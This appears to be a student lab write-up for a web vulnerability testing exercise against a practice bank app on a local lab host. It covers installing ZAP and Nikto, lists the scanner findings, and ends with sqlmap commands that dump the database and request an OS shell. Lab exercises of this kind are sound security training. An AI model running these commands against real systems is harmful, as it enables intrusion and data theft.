### Exercise 2: Black-Box Web Application Vulnerability Testing




__1. Download two web vulnerability scanners and describe the all needed set-up environment
settings__
__solution :__
1. Owasp Zed Attack Proxy (Linux) (Avaialble in `kali Linux`)
   - Download the program from https://www.zaproxy.org/download/ , and select the Linux installer
   - run the file `./ZAP_2_10_0_unix.sh`
   - after successfull installation run the file from command line `$: zapproxy`
   - An gui app will be opened if ran without errors.

2. Nikto Vulnerabuility Scanner
- A command line web vulnerability scanner

```bash
git clone https://github.com/sullo/nikto
# Main script is in program/
cd nikto/program
# Run using the shebang interpreter
./nikto.pl -h http://www.vbank.com
# Run using perl (if you forget to chmod)
perl nikto.pl -h http://www.vbank.com

# to use the proxy
perl nikto.pl -h http://www.vbank.com -useproxy
```
  - Avialble by Default in Kali installation
  - Run the application `nikto -h http://vbank.com`

__2. Report how you found the different vulnerabilities: SQLi, XSS, etc.__
__solution__
1. Nikto Vulnerability Scanner
   - Run the nikto from command line with `--host` switch for host url

![nikto_results](../task3/images/nikto_results.PNG)

- Vulnerabilities/info found:
1. Clickjacking
2. Cross site scripting
3. Directory traversal
4. cookie without httponly flag
5. Server information in response headers



2. Owasp Zap vulnerability scanner
-  run the zapproxy `zapproxy` and click on the `automated scan`

__3. Now you have collected enough information about the victim web application and found
multiple serious SQL injection vulnerabilities.
Use an automatic exploitation tool (e.g. sqlmap) to dump all the database, upload a web shell
and prove that you have control of the bank server!__

- Using `sqlmap` to find sql injection and dump database content
- Usage
```bash
$: sqlmap -u 'http://192.168.37.128/login.php?username=alex' --dbs
```
__Result:__

![sqlmap_dbs](../task3/images/sqlmap_dbs.PNG)

- Found `vbank` database (along with others)
- use `--dump` as switch and dump the contents of database `vbank` with `-D` switch


```bash
└─$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump            
```


- Uploading a shell


```bash
$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' --os-shell
